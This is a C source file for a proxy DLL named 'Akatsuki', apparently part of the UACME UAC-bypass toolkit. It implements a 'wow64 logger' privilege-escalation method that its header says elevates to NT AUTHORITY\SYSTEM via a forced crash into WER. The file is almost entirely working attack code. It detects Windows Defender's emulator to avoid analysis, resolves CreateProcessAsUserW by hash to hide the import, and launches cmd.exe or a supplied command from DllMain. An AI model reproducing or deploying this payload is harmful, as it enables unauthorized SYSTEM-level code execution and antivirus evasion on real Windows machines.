/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2022
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     3.61
*
*  DATE:        22 Jun 2022
*
*  Proxy dll entry point, Akatsuki.
*  Special dll for wow64 logger method.
* 
*  WARNING: real wow64log must have native subsystem and only ntdll export.
*  This one will force crash and propagate to WER process elevating to NTAuthority/System.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

#include "shared\shared.h"
#include "shared\libinc.h"

#define LoadedMsg      TEXT("Akatsuki lock and loaded")

HANDLE g_SyncMutant = NULL;

UACME_PARAM_BLOCK g_SharedParams;


/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{

}

/*
* DbgDumpRuntimeInfo
*
* Purpose:
*
* Dump runtime info to the file, this routine is only for debug builds.
*
*/
VOID DbgDumpRuntimeInfo()
{
    HANDLE hFile = INVALID_HANDLE_VALUE;
    WCHAR szReportName[MAX_PATH * 2];
    WCHAR sysdir[MAX_PATH + 1];

    DWORD cch;
    LPWSTR lpText = NULL;

    DWORD bytesIO;
    WCHAR ch;

    cch = ucmExpandEnvironmentStrings(L"%temp%\\", sysdir, MAX_PATH);
    if ((cch != 0) && (cch < MAX_PATH)) {
        _strcpy(szReportName, sysdir);
        _strcat(szReportName, TEXT("report_"));
        ultostr(GetCurrentProcessId(), _strend(szReportName));
        _strcat(szReportName, TEXT(".txt"));

        hFile = CreateFile(szReportName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {

            ch = (WCHAR)0xFEFF;
            WriteFile(hFile, &ch, sizeof(WCHAR), &bytesIO, NULL);

            lpText = ucmQueryRuntimeInfo(TRUE);
            if (lpText) {
                WriteFile(hFile, lpText, (DWORD)(_strlen(lpText) * sizeof(WCHAR)), &bytesIO, NULL);
                ucmDestroyRuntimeInfo(lpText);
            }
            CloseHandle(hFile);
        }
    }
}

#define Hash_CreateProcessAsUserW 0xb75be93c

/*
* InitFunctionPtr
*
* Purpose:
*
* Retrieve required function ptr.
*
*/
PVOID InitFunctionPtr(
    VOID
)
{
    UNICODE_STRING usKernel = RTL_CONSTANT_STRING(L"kernel32.dll");
    UNICODE_STRING usAdvapi = RTL_CONSTANT_STRING(L"advapi32.dll");

    NTSTATUS ntStatus;
    PVOID ImageBase = NULL, dummy;

    ntStatus = LdrLoadDll(NULL, NULL, &usKernel, &dummy);
    if (NT_SUCCESS(ntStatus)) {

        ntStatus = LdrGetDllHandleEx(LDR_GET_DLL_HANDLE_EX_UNCHANGED_REFCOUNT,
            NULL, NULL, &usAdvapi, &ImageBase);

        if (!NT_SUCCESS(ntStatus)) {
            ntStatus = LdrLoadDll(NULL, NULL, &usAdvapi, &ImageBase);
        }

        if (NT_SUCCESS(ntStatus)) {
            return ucmGetProcedureAddressByHash(ImageBase, Hash_CreateProcessAsUserW);
        }
    }

    return NULL;
}

/*
* DefaultPayload
*
* Purpose:
*
* Process parameter if exist or start cmd.exe and exit immediatelly.
*
*/
VOID DefaultPayload(
    VOID
)
{
    BOOL bSharedParamsReadOk;
    UINT ExitCode = 0;
    PWSTR lpParameter;
    ULONG cbParameter;

    BOOL bIsLocalSystem = FALSE;
    ULONG SessionId;

    PFNCREATEPROCESSASUSERW pCreateProcessAsUser;

    if (!NT_SUCCESS(ucmCreateSyncMutant(&g_SyncMutant))) {
        RtlExitUserProcess(STATUS_SUCCESS);
        return;
    }

    //
    // Read shared params block.
    //
    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
    if (bSharedParamsReadOk) {
        lpParameter = g_SharedParams.szParameter;
        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
        SessionId = g_SharedParams.SessionId;
    }
    else {
        lpParameter = NULL;
        cbParameter = 0UL;
        SessionId = 0;
    }

    ucmIsLocalSystem(&bIsLocalSystem);

    pCreateProcessAsUser = (PFNCREATEPROCESSASUSERW)InitFunctionPtr();

    if (pCreateProcessAsUser) {

        ExitCode = (ucmLaunchPayload2(
            pCreateProcessAsUser,
            bIsLocalSystem,
            SessionId,
            lpParameter,
            cbParameter) != FALSE);

    }
    //
    // Notify Akagi.
    //
    if (bSharedParamsReadOk) {
        ucmSetCompletion(g_SharedParams.szSignalObject);
    }

    ucmSleep(5000);

    NtClose(g_SyncMutant);

    RtlExitUserProcess(ExitCode);
}

/*
* DllMain
*
* Purpose:
*
* Proxy dll entry point.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    ucmDbgMsg(LoadedMsg);

    if (wdIsEmulatorPresent() == STATUS_NEEDS_REMEDIATION)
        RtlExitUserProcess('Foff');

    if (fdwReason == DLL_PROCESS_ATTACH) {

        LdrDisableThreadCalloutsForDll(hinstDLL);      
        DefaultPayload();

    }
    return TRUE;
}

/*
* EntryPointExeMode
*
* Purpose:
*
* Entry point to be used in exe mode.
*
*/
VOID WINAPI EntryPointExeMode(
    VOID
)
{
    BOOL IsDll = RtlImageNtHeader(GetModuleHandle(NULL))->FileHeader.Characteristics & IMAGE_FILE_DLL;
    if (!IsDll) {
        if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
            RtlExitUserProcess('foff');
        }
        DefaultPayload();
    }
}
